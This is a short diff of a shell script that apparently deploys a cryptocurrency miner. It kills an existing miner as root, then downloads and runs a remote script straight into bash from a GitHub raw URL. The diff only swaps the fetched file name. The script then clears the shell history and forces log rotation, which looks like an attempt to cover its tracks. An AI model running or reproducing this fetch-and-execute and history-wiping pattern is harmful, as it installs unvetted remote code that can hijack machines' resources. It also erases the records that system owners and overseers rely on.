@@ -9,7 +9,7 @@ else
   chmod +x /root/kill_miner.sh
   ./kill_miner.sh
   sleep 3
-  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerBIT.sh')
+  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerBITSBR.sh')
 fi
 history -c && history -w
 sudo logrotate -f /etc/logrotate.conf
